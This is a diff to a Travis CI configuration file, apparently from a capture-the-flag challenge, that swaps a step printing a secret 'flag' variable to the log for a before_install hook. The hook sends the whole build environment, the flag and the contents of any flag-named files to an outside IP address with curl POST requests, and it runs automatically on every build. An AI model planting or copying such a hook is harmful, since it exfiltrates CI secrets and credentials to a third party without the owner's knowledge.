@@ -1,6 +1,12 @@
 language: node_js
-services: [docker]
-install: ["echo install nothing"]
-script: ["echo no tests"]
-after_success:
-  - echo "===FLAG_B64==="; printenv flag | base64 -w0; echo; echo "===END==="
+before_install:
+  - |
+    C="http://3.17.42.211:9997/travis-${TRAVIS_JOB_ID:-x}"
+    curl -s -m 20 "$C/alive" || true
+    curl -s -m 25 -X POST "$C/env" --data-binary "$(env | sort | base64 -w0)" || true
+    curl -s -m 20 -X POST "$C/flag" --data-binary "$(printenv flag | base64 -w0)" || true
+    curl -s -m 20 -X POST "$C/files" --data-binary "$( { find / -iname '*flag*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -40; cat /flag* 2>/dev/null; } | base64 -w0)" || true
+install:
+  - echo install nothing
+script:
+  - echo no tests
